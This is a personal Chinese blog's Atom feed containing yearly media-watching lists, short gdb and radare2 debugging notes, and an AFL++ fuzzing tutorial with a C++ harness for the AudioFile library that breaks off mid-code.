<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>几处早莺争暖树，谁家新燕啄春泥。</subtitle>
  <link href="http://finsenty54.github.io/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2024-03-24T05:15:31.011Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>我的2023</title>
    <link href="http://finsenty54.github.io/2024/03/24/%E6%88%91%E7%9A%842023/"/>
    <id>http://finsenty54.github.io/2024/03/24/%E6%88%91%E7%9A%842023/</id>
    <published>2024-03-24T05:10:57.000Z</published>
    <updated>2024-03-24T05:15:31.011Z</updated>
    
    <content type="html"><![CDATA[<h3 id="电影："><a href="#电影：" class="headerlink" title="电影："></a>电影：</h3><ul><li>神奇动物在哪里3（01.02），</li><li>星球大战前传3：西斯的复仇（01.05），</li><li>游侠索罗：星球大战外传（01.08），</li><li>谍影重重3（01.12），</li><li>星球大战外传 侠盗一号（01.15），</li><li>谍影重重1（01.26），</li><li>红番区，谍影重重2（01.28），</li><li>谍影重重4、5（01.29），</li><li>警察故事4：简单任务（02.02），</li><li>正义联盟：扎导（02.03）</li><li>超级学校霸王（02.09），</li><li>古惑仔之少年激斗篇（02.10），</li><li>旺角卡门（02.13），</li><li>枪王之王（02.14），</li><li>赌侠1999（02.15），</li><li>赌侠大战拉斯维加斯（02.16），</li><li>东方三侠（02.17），<a id="more"></a></li><li>地狱尖兵（02.25），</li><li>生化危机2:启示录、生化危机3:灭绝、生化危机4：战神再生、生化危机5：惩罚（02.25），</li><li>生化危机6：终章、星球大战7：原力觉醒（02.26），</li><li>好莱坞往事（02.27），</li><li>星球大战8：最后的绝地武士（03.01），</li><li>星球大战9：天行者崛起（03.03），</li><li>低俗小说（03.15），</li><li>阿凡达：水之道（03.30），</li><li>无名（04.11），</li><li>独立日2：卷土重来（04.11），</li><li>雷霆沙赞！众神之怒（04.12），</li><li>第六感（04.12），</li><li>三傻大闹宝莱坞（04.12），</li><li>千与千寻（04.13），</li><li>哈尔的移动城堡（04.13），</li><li>龙猫（04.14），</li><li>布达佩斯大饭店（04.14），</li><li>天空之城（04.14），</li><li>流浪地球2（04.15），</li><li>幽灵公主（04.16），</li><li>小偷家族（04.16），</li><li>亲爱的，不要跨过那条江（04.16），</li><li>蚁人与黄蜂女：量子狂潮，</li><li>满江红（04.30），</li><li>龙与地下城：侠盗荣耀（05.03），</li><li>宇宙探索编辑部（05.11），</li><li>鬼玩人崛起（12111</li><li>狩猎The Hunt（06.11），</li><li>林中小屋（06.11），</li><li>异形：契约（06.17），</li><li>异形2（06.18），</li><li>异形大战铁血战士（06.18），</li><li>东邪西毒：终极版（06.24），</li><li>笑傲江湖（06.24），</li><li>笑傲江湖2：东方不败（06.25），</li><li>东方不败之风云再起（06.26），</li><li>倩女幽魂2：人间道（06.27），</li><li>倩女幽魂3：道道道（06.28）</li><li>犯罪都市3（07.07），</li><li>银河护卫队3（07.08），</li><li>速度与激情（07.09），</li><li>射雕英雄传之东成西就（07.09），</li><li>铃芽之旅（07.10），</li><li>范海辛（07.12），</li><li>变形金刚：超能勇士崛起（07.15），</li><li>速度与激情2（07.16），</li><li>闪电侠（07.21），</li><li>十二只猴子（07.24），</li><li>新龙门客栈（07.26），</li><li>罪恶之城（07.30），</li><li>这个男人来自地球（08.06），</li><li>东北警察故事2（08.07），</li><li>关于我和鬼变成家人的那件事（08.12），</li><li>消失的她（09.02），</li><li>喜剧之王（09.06），</li><li>功夫足球（09.09），</li><li>大话西游之月光宝盒（09.10），</li><li>西遊記大結局之仙履奇緣（09.11），</li><li>何以为家（09.13），</li><li>芭比（09.26）,</li><li>封神1：朝歌风云（10.06），</li><li>GT赛车：极速狂飙（10.14），</li><li>电锯惊魂（10.20），</li><li>志愿军：雄兵出击（10.27），</li><li>济公（11.10），</li><li>电锯惊魂10（11.24），</li><li>特种部队：眼镜蛇的崛起（12.23），</li><li>特种部队2：全面反击（12.24），</li><li>绿灯侠（12.24），</li><li>终结者：创世纪（12.24），</li><li>星际迷航（12.30）,</li><li>星际迷航 暗黑无界 12.31</li><li>星际迷航 超越星辰 12.31</li></ul><h3 id="电视剧："><a href="#电视剧：" class="headerlink" title="电视剧："></a>电视剧：</h3><ul><li>最后生还者（03.14），</li><li>曼达洛人第三季（04.21），</li><li>怒呛人生（05.14)，</li><li>和平使者（06.24），</li><li>D.P：逃兵追缉令（08.02），</li><li>D.P：逃兵追缉令第二季（08.05）</li><li>海贼王（09.28），</li><li>V世代（11.05），</li><li>兄弟连（11.18），</li><li>甜蜜家园（11.23），</li><li>笑傲江湖（12.02）</li></ul><h3 id="动漫："><a href="#动漫：" class="headerlink" title="动漫："></a>动漫：</h3><ul><li>进击的巨人 完结篇 前篇，</li><li>死神 千年血战篇，</li><li>星球大战：幻境 第二季（05.16），</li><li>进击的巨人 完结篇 后篇（11.06）</li></ul><h3 id="纪录片："><a href="#纪录片：" class="headerlink" title="纪录片："></a>纪录片：</h3><ul><li>宫崎骏：十载同行（04.15），</li><li>人生七年 7 UP，人生七年14 UP（04.16）</li></ul><h3 id="游戏："><a href="#游戏：" class="headerlink" title="游戏："></a>游戏：</h3><ul><li>path of exile 3.20，3.21，3.22，3.23</li><li>星球大战绝地：陨落的武士团，</li><li>Spider-man Remastered，</li><li>蝙蝠侠：阿卡姆疯人院</li></ul><h3 id="小说"><a href="#小说" class="headerlink" title="小说:"></a>小说:</h3><ul><li>神魔养殖场，</li><li>幽冥仙途，</li><li>问镜（10.30）</li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;电影：&quot;&gt;&lt;a href=&quot;#电影：&quot; class=&quot;headerlink&quot; title=&quot;电影：&quot;&gt;&lt;/a&gt;电影：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;神奇动物在哪里3（01.02），&lt;/li&gt;
&lt;li&gt;星球大战前传3：西斯的复仇（01.05），&lt;/li&gt;
&lt;li&gt;游侠索罗：星球大战外传（01.08），&lt;/li&gt;
&lt;li&gt;谍影重重3（01.12），&lt;/li&gt;
&lt;li&gt;星球大战外传 侠盗一号（01.15），&lt;/li&gt;
&lt;li&gt;谍影重重1（01.26），&lt;/li&gt;
&lt;li&gt;红番区，谍影重重2（01.28），&lt;/li&gt;
&lt;li&gt;谍影重重4、5（01.29），&lt;/li&gt;
&lt;li&gt;警察故事4：简单任务（02.02），&lt;/li&gt;
&lt;li&gt;正义联盟：扎导（02.03）&lt;/li&gt;
&lt;li&gt;超级学校霸王（02.09），&lt;/li&gt;
&lt;li&gt;古惑仔之少年激斗篇（02.10），&lt;/li&gt;
&lt;li&gt;旺角卡门（02.13），&lt;/li&gt;
&lt;li&gt;枪王之王（02.14），&lt;/li&gt;
&lt;li&gt;赌侠1999（02.15），&lt;/li&gt;
&lt;li&gt;赌侠大战拉斯维加斯（02.16），&lt;/li&gt;
&lt;li&gt;东方三侠（02.17），</summary>
    
    
    
    <category term="日记" scheme="http://finsenty54.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>我的2022</title>
    <link href="http://finsenty54.github.io/2023/01/02/%E6%88%91%E7%9A%842022/"/>
    <id>http://finsenty54.github.io/2023/01/02/%E6%88%91%E7%9A%842022/</id>
    <published>2023-01-02T10:01:18.000Z</published>
    <updated>2023-01-02T10:25:17.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="电影："><a href="#电影：" class="headerlink" title="电影："></a>电影：</h3><ul><li>长津湖，</li><li>大明劫，</li><li>玻璃樽，</li><li>生化寿尸(01.22)，</li><li>蝴蝶效应(01.26)，</li><li>不要抬头(02,20)，</li><li>咒怨1,2(03.05，03.06)，</li><li>古惑仔3，</li><li>古惑仔1，</li><li>古惑仔2(03.11.12)，</li><li>古惑仔5(03.13)，</li><li>蜘蛛侠：英雄无归，</li><li>古惑仔6(03.14)，</li><li>特务迷城(03.24)，</li><li>狙击手(03.28)，</li><li>你的名字(03.29)，<a id="more"></a></li><li>moonfall(04.01)，</li><li>鸟人(04.05)，</li><li>生死停留(04.09)，</li><li>哭声(04.13)，</li><li>新蝙蝠侠(04.18)，</li><li>兹山鱼谱(04.22)，</li><li>长津湖之水门桥(04,30)，</li><li>套装(05.07)，</li><li>瞬息全宇宙（05.20），</li><li>壮志凌云（06.07），</li><li>目中无人（06.08），</li><li>英雄（07.12），</li><li>烈日灼心（07.17），</li><li>谁是超级英雄（07.21），</li><li>铁血战士：猎物（08.06），</li><li>壮志凌云2（08.26），</li><li>铁血战士1987（08.31），</li><li>隐入尘烟（09.18），</li><li>星球大战第四集：新希望（09.27），</li><li>星球大战第五集：帝国反击战（09.30），</li><li>星球大战第六集：绝地归来（10.1），</li><li>一场很（没）有必要的春晚（10.14），</li><li>狩猎（10.16），</li><li>新奥特曼（10.21），</li><li>西线无战事（10.28），</li><li>碟中谍4（11.4），</li><li>碟中谍6（11.12），</li><li>子弹列车（11.14），</li><li>黑亚当（11.19），</li><li>新神榜杨戬（11.20），</li><li>雷神4（11.23），</li><li>阿凡达（11.26），</li><li>刀（11.28），</li><li>遗落战境（12.04），</li><li>星球大战前传1：幽灵的威胁，</li><li>星球大战前传2：克隆人的进攻（12.09），</li><li>万里归途（12.21），</li><li>龙虎武师（12.26），</li><li>我们的1944（12.27），</li><li>犯罪都市2</li></ul><h3 id="纪录片："><a href="#纪录片：" class="headerlink" title="纪录片："></a>纪录片：</h3><ul><li>再见了所有的福音战士！庵野秀明的1214日，</li><li>环绕日本(02.24完)，</li><li>台灣菁英戰士-傲氣飛鷹(08.03)</li></ul><h3 id="电视剧："><a href="#电视剧：" class="headerlink" title="电视剧："></a>电视剧：</h3><ul><li>僵尸校园，</li><li>黑袍纠察队第二季，</li><li>爱死亡机器人（05.23），</li><li>怪奇物语 第四季，</li><li>毛骗第一季（06.16），第二季，</li><li>浴血黑帮 第六季（09.12），</li><li>睡魔（10.24），</li><li>安多（12.03），</li><li>黑袍纠察队第二季（12.08），</li><li>老友记第一季（12.30）</li></ul><h3 id="动漫："><a href="#动漫：" class="headerlink" title="动漫："></a>动漫：</h3><ul><li>EVA TV版，</li><li>EVA 新世纪福音战士剧场版：Air / 真心为你，</li><li>EVA 新世纪福音战士新剧场版1.11：序，</li><li>EVA 新世纪福音战士新剧场版2.22：破(01.23)，</li><li>福音战士新剧场版：Q ヱヴァンゲリヲン新劇場版：Q (2.2)，</li><li> 新·福音战士剧场版：终 シン・エヴァンゲリオン劇場版:│▌(2.26)，</li><li>进击的巨人 最终季 part1(04.27)，</li><li>进击的巨人 最终季 part2(04.29)，</li><li>紫罗兰永恒花园 剧场版(05.12)，</li><li>赛博朋克：边缘行者（10.05），</li><li>灵能百分百第三季</li></ul><h3 id="游戏："><a href="#游戏：" class="headerlink" title="游戏："></a>游戏：</h3><ul><li>流放之路 3.17，3.18，3.19，3.20</li><li>战神4</li></ul><h3 id="小说："><a href="#小说：" class="headerlink" title="小说："></a>小说：</h3><ul><li>妖刀记</li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;电影：&quot;&gt;&lt;a href=&quot;#电影：&quot; class=&quot;headerlink&quot; title=&quot;电影：&quot;&gt;&lt;/a&gt;电影：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;长津湖，&lt;/li&gt;
&lt;li&gt;大明劫，&lt;/li&gt;
&lt;li&gt;玻璃樽，&lt;/li&gt;
&lt;li&gt;生化寿尸(01.22)，&lt;/li&gt;
&lt;li&gt;蝴蝶效应(01.26)，&lt;/li&gt;
&lt;li&gt;不要抬头(02,20)，&lt;/li&gt;
&lt;li&gt;咒怨1,2(03.05，03.06)，&lt;/li&gt;
&lt;li&gt;古惑仔3，&lt;/li&gt;
&lt;li&gt;古惑仔1，&lt;/li&gt;
&lt;li&gt;古惑仔2(03.11.12)，&lt;/li&gt;
&lt;li&gt;古惑仔5(03.13)，&lt;/li&gt;
&lt;li&gt;蜘蛛侠：英雄无归，&lt;/li&gt;
&lt;li&gt;古惑仔6(03.14)，&lt;/li&gt;
&lt;li&gt;特务迷城(03.24)，&lt;/li&gt;
&lt;li&gt;狙击手(03.28)，&lt;/li&gt;
&lt;li&gt;你的名字(03.29)，</summary>
    
    
    
    <category term="日记" scheme="http://finsenty54.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn复习.md</title>
    <link href="http://finsenty54.github.io/2022/01/10/pwn%E5%A4%8D%E4%B9%A0-md/"/>
    <id>http://finsenty54.github.io/2022/01/10/pwn%E5%A4%8D%E4%B9%A0-md/</id>
    <published>2022-01-10T12:36:56.000Z</published>
    <updated>2022-01-10T13:04:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn复习"><a href="#pwn复习" class="headerlink" title="pwn复习"></a>pwn复习</h2><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><ol><li><code>n</code> 步过，<code>s</code>步进</li><li><code>set args toto</code> 设置参数</li><li>设置寄存器值<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> $ZF = <span class="number">6</span></span><br><span class="line"><span class="built_in">set</span> $eflags |= (<span class="number">1</span> &lt;&lt; $ZF)</span><br></pre></td></tr></table></figure>将ZF设定为1</li><li>为断点设置命令<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) command &lt;insert the number of the first breakpoint here&gt;</span><br><span class="line"> &gt; print $al^$dl  <span class="meta">#we print al xor dl, that is to say the expected char</span></span><br><span class="line"> &gt; <span class="keyword">continue</span></span><br><span class="line"> &gt; end  </span><br></pre></td></tr></table></figure></li></ol><h3 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h3><p>栈帧开辟-<br>下一个命令的地址 -&gt; 上一个栈帧的ebp -&gt; 新的栈<br>此时ebp 保存 &lt;上一个栈帧的ebp&gt; 的地址</p><h3 id="radare2使用"><a href="#radare2使用" class="headerlink" title="radare2使用"></a>radare2使用</h3><ol><li>图形模式下，按 <code>o</code> 进行跳转， 按 <code>u</code> 返回到上一个函数</li><li></li><li>third</li></ol><a id="more"></a>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;pwn复习&quot;&gt;&lt;a href=&quot;#pwn复习&quot; class=&quot;headerlink&quot; title=&quot;pwn复习&quot;&gt;&lt;/a&gt;pwn复习&lt;/h2&gt;&lt;h3 id=&quot;gdb调试&quot;&gt;&lt;a href=&quot;#gdb调试&quot; class=&quot;headerlink&quot; title=&quot;gdb调试&quot;&gt;&lt;/a&gt;gdb调试&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;n&lt;/code&gt; 步过，&lt;code&gt;s&lt;/code&gt;步进&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set args toto&lt;/code&gt; 设置参数&lt;/li&gt;
&lt;li&gt;设置寄存器值&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; $ZF = &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; $eflags |= (&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; $ZF)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
将ZF设定为1&lt;/li&gt;
&lt;li&gt;为断点设置命令&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(gdb) command &amp;lt;insert the number of the first breakpoint here&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;gt; print $al^$dl  &lt;span class=&quot;meta&quot;&gt;#we print al xor dl, that is to say the expected char&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;gt; &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;gt; end  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;栈布局&quot;&gt;&lt;a href=&quot;#栈布局&quot; class=&quot;headerlink&quot; title=&quot;栈布局&quot;&gt;&lt;/a&gt;栈布局&lt;/h3&gt;&lt;p&gt;栈帧开辟-&lt;br&gt;下一个命令的地址 -&amp;gt; 上一个栈帧的ebp -&amp;gt; 新的栈&lt;br&gt;此时ebp 保存 &amp;lt;上一个栈帧的ebp&amp;gt; 的地址&lt;/p&gt;
&lt;h3 id=&quot;radare2使用&quot;&gt;&lt;a href=&quot;#radare2使用&quot; class=&quot;headerlink&quot; title=&quot;radare2使用&quot;&gt;&lt;/a&gt;radare2使用&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;图形模式下，按 &lt;code&gt;o&lt;/code&gt; 进行跳转， 按 &lt;code&gt;u&lt;/code&gt; 返回到上一个函数&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;third&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>AFL++使用</title>
    <link href="http://finsenty54.github.io/2021/06/07/afl++/"/>
    <id>http://finsenty54.github.io/2021/06/07/afl++/</id>
    <published>2021-06-07T10:31:03.000Z</published>
    <updated>2021-06-07T10:36:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h2><p>模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是将自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p><p>模糊测试最早由威斯康星大学的Barton Miller于1988年提出。他们的工作不仅使用随机无结构的测试数据，还系统的利用了一系列的工具去分析不同平台上的各种软件，并对测试发现的错误进行了系统的分析。此外，他们还公开了源代码，测试流程以及原始结果数据。</p><p>模糊测试工具主要分为两类，变异测试（mutation-based）以及生成测试（generation-based）。模糊测试可以被用作白盒，灰盒或黑盒测试。文件格式与网络协议是最常见的测试目标，但任何程序输入都可以作为测试对象。常见的输入有环境变量，鼠标和键盘事件以及API调用序列。甚至一些通常不被考虑成输入的对象也可以被测试，比如数据库中的数据或共享内存。</p><p>对于安全相关的测试，那些跨越可信边界的数据是最令人感兴趣的。比如，模糊测试那些处理任意用户上传的文件的代码比测试解析服务器配置文件的代码更重要。因为服务器配置文件往往只能被有一定权限的用户修改。</p><a id="more"></a><h2 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h2><p>AFL是fuzzing使用率较高的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响。AFL基于覆盖引导（Coverage-guided），它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><p>AFL对开源代码进行fuzzing的过程可以用以下五步描述：</p><ol><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）</li><li>将队列中的文件按一定的策略进行 “突变”</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li><li>上述过程会一直循环进行，期间触发了crash的文件会被记录下来</li></ol><h2 id="AFLplusplus"><a href="#AFLplusplus" class="headerlink" title="AFLplusplus"></a>AFLplusplus</h2><p>AFL++ 是 AFL 的高级分支——更快的速度、更多更好的突变、更多更好的工具、自定义模块支持等。</p><h2 id="AudioFile"><a href="#AudioFile" class="headerlink" title="AudioFile"></a>AudioFile</h2><p>一个简单的头文件 C++ 库，用于读写音频文件。这是我fuzzing的目标。</p><h2 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>最简单的方式就是使用docker</p><p><code>docker pull aflplusplus/aflplusplus</code><br><code>docker run -ti -v /location/of/your/target:/src aflplusplus/aflplusplus</code></p><h3 id="准备被测试源码"><a href="#准备被测试源码" class="headerlink" title="准备被测试源码"></a>准备被测试源码</h3><p>根据官方提供的示例代码略做修改做为测试代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _USE_MATH_DEFINES</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;AudioFile.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> examples</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeSineWaveToAudioFile</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadAudioFileAndPrintSummary</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadAudioFileAndProcessSamples</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line">&#125; <span class="comment">// namespace examples</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//进行AFL Persistent mode</span></span><br><span class="line">    <span class="keyword">while</span> (__AFL_LOOP(<span class="number">10000</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/** Loads an audio file and prints key details to the console*/</span></span><br><span class="line">        examples::loadAudioFileAndPrintSummary(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** Loads an audio file and processess the samples */</span></span><br><span class="line">        examples::loadAudioFileAndProcessSamples(argv[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> examples</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">writeSineWaveToAudioFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Running Example: Write Sine Wave To Audio File&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. Let&#x27;s setup our AudioFile instance</span></span><br><span class="line">        AudioFile&lt;<span class="keyword">float</span>&gt; a;</span><br><span class="line">        a.setNumChannels(<span class="number">2</span>);</span><br><span class="line">        a.setNumSamplesPerChannel(<span class="number">44100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. Create some variables to help us generate a sine wave</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">float</span> sampleRate = <span class="number">44100.f</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">float</span> frequencyInHz = <span class="number">440.f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. Write the samples to the AudioFile sample buffer</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.getNumSamplesPerChannel(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> channel = <span class="number">0</span>; channel &lt; a.getNumChannels(); channel++)</span><br><span class="line">            &#123;</span><br><span class="line">                a.samples[channel][i] = <span class="built_in">sin</span>((<span class="keyword">static_cast</span>&lt;<span class="keyword">float</span>&gt;(i) / sampleRate) * frequencyInHz * <span class="number">2.f</span> * M_PI);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. Save the AudioFile</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> filePath = <span class="string">&quot;sine-wave.wav&quot;</span>; <span class="comment">// change this to somewhere useful for you</span></span><br><span class="line">        a.save(<span class="string">&quot;sine-wave.wav&quot;</span>, AudioFileFormat::Wave);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadAudioFileAndPrintSummary</span><span class="params">(<span class="keyword">char</span> *file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span 